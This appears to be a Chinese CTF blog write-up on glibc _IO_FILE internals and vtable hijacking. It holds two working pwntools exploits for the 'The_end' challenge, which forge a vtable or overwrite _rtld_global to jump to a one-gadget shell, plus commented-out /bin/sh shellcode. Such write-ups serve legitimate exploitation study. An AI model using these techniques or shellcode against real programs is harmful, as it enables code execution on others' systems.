@@ -1,0 +1,564 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>IO_FILE探索 - V1ct0r的博客</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="TriDiamond Obsidian,"> 
+    <meta name="description" content="一、IO_File结构体一览首先看一波源码：
+
+
+12345678910111213141516171819202122232425262728293031323334353637383940414,"> 
+    <meta name="author" content="V1ct0r"> 
+    <link rel="alternative" href="atom.xml" title="V1ct0r的博客" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+
+    
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+
+    
+<link rel="stylesheet" href="/css/obsidian.css">
+
+    
+<link rel="stylesheet" href="/css/ball-atom.min.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">V1ct0r的博客</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="http://yoursite.com">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">IO_FILE探索</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="javascript:;" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url(/img/cover.jpg) ">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="/categories/PWN"><b>「
+                    </b>PWN<b> 」</b></a>
+                
+                January 03, 2020
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/2020/01/03/IO_File/" title="IO_FILE探索" class="">IO_FILE探索</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>Words count</i>
+                    81k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
+                    1:13
+                </span>
+                
+                
+                
+                <span id="busuanzi_container_page_pv">
+                    <b class="iconfont icon-read"></b> <i>Read count</i>
+                    <span id="busuanzi_value_page_pv">0</span>
+                </span>
+                
+            </p>
+            
+            
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/vtable%E8%B7%B3%E8%BD%AC/" rel="tag">vtable跳转</a></li><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/%E6%B3%84%E6%BC%8F%E5%9C%B0%E5%9D%80/" rel="tag">泄漏地址</a></li></ul>
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <h4 id="一、IO-File结构体一览"><a href="#一、IO-File结构体一览" class="headerlink" title="一、IO_File结构体一览"></a>一、IO_File结构体一览</h4><p>首先看一波源码：</p>
+<a id="more"></a>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> short _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>其实进程中的FILE结构会通过_chain域彼此连接形成一个链表，链表头部用全局变量_IO_list_all表示</p>
+<p>，通过这个值我们可以遍历所有的FILE结构,而这个chain字段中存储的偏移是0x60，也就是说每隔0x60就有一个结构体出现，这里可以调试看看</p>
+<p><img src="/blog_img/image-20200527225237230.png" alt="image-20200527225237230"></p>
+<p><img src="/blog_img/image-20200527225301006.png" alt="image-20200527225301006"></p>
+<p>在标准的I/O库中，stdin、stdout、stderr是在libc.so的数据段的，而且三个文件流是自动打开的 ，但是fopen创建的文件流则是在堆中，看下符号长什么样：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_2_1_stderr_</span><br><span class="line">_IO_2_1_stdout_</span><br><span class="line">_IO_2_1_stdin_</span><br></pre></td></tr></table></figure>
+
+<p>但是file结构其实只是一小部分，它有个兄弟叫vtable指针，两人一起同属于_IO_File_plus:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    IO_jump_t   *vtable;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//32位下的偏移是0x94，而64位下偏移是0xd8</span></span><br></pre></td></tr></table></figure>
+
+<p>在gdb中调试下看看：</p>
+<p><img src="/blog_img/1568636872005.png" alt="56863687200"></p>
+<p>Vtable存着哪些可以跳转的函数指针呢？看看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">void * funcs[] &#x3D; &#123;</span><br><span class="line">   1 NULL, &#x2F;&#x2F; &quot;extra word&quot;</span><br><span class="line">   2 NULL, &#x2F;&#x2F; DUMMY</span><br><span class="line">   3 exit, &#x2F;&#x2F; finish</span><br><span class="line">   4 NULL, &#x2F;&#x2F; overflow</span><br><span class="line">   5 NULL, &#x2F;&#x2F; underflow</span><br><span class="line">   6 NULL, &#x2F;&#x2F; uflow</span><br><span class="line">   7 NULL, &#x2F;&#x2F; pbackfail</span><br><span class="line">   </span><br><span class="line">   8 NULL, &#x2F;&#x2F; xsputn  #printf</span><br><span class="line">   9 NULL, &#x2F;&#x2F; xsgetn</span><br><span class="line">   10 NULL, &#x2F;&#x2F; seekoff</span><br><span class="line">   11 NULL, &#x2F;&#x2F; seekpos</span><br><span class="line">   12 NULL, &#x2F;&#x2F; setbuf</span><br><span class="line">   13 NULL, &#x2F;&#x2F; sync</span><br><span class="line">   14 NULL, &#x2F;&#x2F; doallocate</span><br><span class="line">   15 NULL, &#x2F;&#x2F; read</span><br><span class="line">   16 NULL, &#x2F;&#x2F; write</span><br><span class="line">   17 NULL, &#x2F;&#x2F; seek</span><br><span class="line">   18 pwn,  &#x2F;&#x2F; close</span><br><span class="line">   19 NULL, &#x2F;&#x2F; stat</span><br><span class="line">   20 NULL, &#x2F;&#x2F; showmanyc</span><br><span class="line">   21 NULL, &#x2F;&#x2F; imbue</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/blog_img/1568637328284.png" alt="56863702635"></p>
+<p>这里自己写了个简单的程序去研究：</p>
+<p><img src="/blog_img/1568529216993.png" alt="56852921699"></p>
+<p><img src="/blog_img/1568528701432.png" alt="56852870143"></p>
+<p><img src="/blog_img/1568528767669.png" alt="56852876766">)<img src="/blog_img/1568528788791.png" alt="56852878879">)<img src="/blog_img/1568528824597.png" alt="56852882459">)<img src="/blog_img/1568528845396.png" alt="56852884539">)<img src="/blog_img/1568528865847.png" alt="56852886584">)<img src="/blog_img/1568528909832.png" alt="56852890983">)<img src="/blog_img/1568528919486.png" alt="56852891948">)<img src="/blog_img/1568528946728.png" alt="56852894672"></p>
+<p><img src="/blog_img/1568529153124.png" alt="56852915312"></p>
+<p>可以看到一个简单的puts函数，调用的过程是puts——&gt;IO_file_xsputn——&gt;IO_file_overflow——&gt;………malloc(“666”）——&gt;write输出666</p>
+<p>_IO_FILE_plus 结构中存在 vtable，一些函数会取出 vtable 中的指针进行调用。</p>
+<p>因此伪造vtable劫持控制流程的思想就是针对_IO_File_plus的vtable动手脚，通过把vtable指向我们控制的内存，并在其中部署函数指针来实现</p>
+<p>所以vtable劫持分为2种，一种是直接改写vtable的函数的指针，通过任意地址写就可以实现。另一种是覆盖vtable的指针为我们控制的内存，然后在其中布置函数指针。</p>
+<h4 id="二、修改vtable实现控制程序流程："><a href="#二、修改vtable实现控制程序流程：" class="headerlink" title="二、修改vtable实现控制程序流程："></a>二、修改vtable实现控制程序流程：</h4><h4 id="The-end"><a href="#The-end" class="headerlink" title="The_end"></a>The_end</h4><p><img src="/blog_img/1568533815721.png" alt="56853381572"></p>
+<p><img src="/blog_img/1568533835651.png" alt="56853383565"></p>
+<p>有点不寻常的题目，肯定是新姿势，close关闭的话就无法再输出信息，但是前面给了sleep的真实地址，所以直接泄露出来得到onegadget，同时我们知道exit会调用_IO_2_1_stdout_的sebuf函数，接着就是任意地址写5字节的操作了（假想</p>
+<p>成格式化字符串写地址），具体往哪里写呢，先来看下结构体：</p>
+<p><img src="/blog_img/1568640153712.png" alt="56864015371"></p>
+<p><img src="/blog_img/1568640217962.png" alt="56864021796"></p>
+<p><img src="/blog_img/1568640310485.png" alt="56864031048"></p>
+<p><img src="/blog_img/1568637963142.png" alt="56863796314"></p>
+<p><img src="/blog_img/1568637638432.png" alt="56863763843"></p>
+<p>可以看到setbuf的偏移为88，那么我们可以伪造vtable指针和setbuf地址，选取<strong>IO_2_1_stdout+160作为我们的setbuf的地址，</strong>IO_2_1_stdout+160-88就是我们的fake_vtable地址，这样我们一共需要填5次，第一次填写vtable的低2位字节，第二次填写onegadget的低3位字节，由于偏移是不变的，所以直接打：</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libformatstr <span class="keyword">import</span> FormatStr</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./the_end'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./the_end'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147</span></span><br><span class="line"><span class="comment">#onegadget32(libc.so.6)  0x3ac5c  0x3ac5e  0x3ac62  0x3ac69  0x5fbc5  0x5fbc6</span></span><br><span class="line"><span class="comment"># payload32 = fmtstr_payload(offset ，&#123;xxx_got:system_addr&#125;)</span></span><br><span class="line"><span class="comment"># f = FormatStr(isx64=1)</span></span><br><span class="line"><span class="comment"># f[0x8048260]=0x45372800</span></span><br><span class="line"><span class="comment"># f[0x8048260+4]=0x7f20</span></span><br><span class="line"><span class="comment"># f.payload(7)</span></span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line"><span class="comment">#shellcode32 = '\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80' </span></span><br><span class="line"><span class="comment">#shellcode64 = '\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05'</span></span><br><span class="line"><span class="comment">#shellcode64 = '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'</span></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line">debug(<span class="number">0x000964</span>)</span><br><span class="line">ru(<span class="string">"gift "</span>)</span><br><span class="line">sleep_addr = int(rc(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"sleep_addr---&gt;"</span> + hex(sleep_addr)</span><br><span class="line">libc_base = sleep_addr - libc.symbols[<span class="string">'sleep'</span>]</span><br><span class="line">onegadget = libc_base + <span class="number">0xf02a4</span></span><br><span class="line">vtable = libc_base + <span class="number">0x3c56f8</span></span><br><span class="line">fake_vtable = vtable - <span class="number">0x90</span></span><br><span class="line">fake_setbuf = fake_vtable + <span class="number">88</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">    sd(p64(vtable+i))</span><br><span class="line">    sd(p64(fake_vtable)[i])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    sd(p64(fake_setbuf+i))</span><br><span class="line">    sd(p64(onegadget)[i])</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>调试看看情况，发现成功改写：</p>
+<p><img src="/blog_img/1568639705006.png" alt="56863970500"></p>
+<p>其实这题还可以直接利用exit执行_dl_fini:</p>
+<p><img src="/blog_img/1568640708529.png" alt="56864070852"></p>
+<p><img src="/blog_img/1568640732892.png" alt="56864073289"></p>
+<p>我们直接往0x7f6086f14f48 (_rtld_global+3848)写入onegadget的4个字节即可 ：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libformatstr <span class="keyword">import</span> FormatStr</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./the_end'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./the_end'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147</span></span><br><span class="line"><span class="comment">#onegadget32(libc.so.6)  0x3ac5c  0x3ac5e  0x3ac62  0x3ac69  0x5fbc5  0x5fbc6</span></span><br><span class="line"><span class="comment"># payload32 = fmtstr_payload(offset ，&#123;xxx_got:system_addr&#125;)</span></span><br><span class="line"><span class="comment"># f = FormatStr(isx64=1)</span></span><br><span class="line"><span class="comment"># f[0x8048260]=0x45372800</span></span><br><span class="line"><span class="comment"># f[0x8048260+4]=0x7f20</span></span><br><span class="line"><span class="comment"># f.payload(7)</span></span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line"><span class="comment">#shellcode32 = '\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80' </span></span><br><span class="line"><span class="comment">#shellcode64 = '\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05'</span></span><br><span class="line"><span class="comment">#shellcode64 = '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'</span></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line">debug(<span class="number">0x000964</span>)</span><br><span class="line">ru(<span class="string">"gift "</span>)</span><br><span class="line">sleep_addr = int(rc(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"sleep_addr---&gt;"</span> + hex(sleep_addr)</span><br><span class="line">libc_base = sleep_addr - libc.symbols[<span class="string">'sleep'</span>]</span><br><span class="line">onegadget = libc_base + <span class="number">0xf02a4</span></span><br><span class="line">vtable = libc_base + <span class="number">0x3c56f8</span></span><br><span class="line">fake_vtable = vtable - <span class="number">0x90</span></span><br><span class="line">fake_setbuf = fake_vtable + <span class="number">88</span></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line"></span><br><span class="line">fake_got = libc_base + <span class="number">0x5f0f48</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"fake_got---&gt;"</span>  + hex(fake_got)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"onegadget---&gt;"</span> + hex(onegadget)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    sd(p64(fake_got+i))</span><br><span class="line">    sd(p64(onegadget)[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>总结：这种是通过改vtable指针，通过伪造vtable指针来改变跳转。</p>
+<h4 id="三、IO-2-1-stdout-泄露地址"><a href="#三、IO-2-1-stdout-泄露地址" class="headerlink" title="三、IO_2_1_stdout_泄露地址"></a>三、IO_2_1_stdout_泄露地址</h4><p>这里得看一波源码才了解具体的原理：</p>
+<p>首先得知道puts函数的函数调用链：</p>
+<p>我们知道puts函数在源码中是通过_IO_puts函数的内部调用_IO_sputn实现，结果会执行_IO_new_file_xsputn，最终执行_IO_overflow，我们来看下_IO_puts的源码实现：</p>
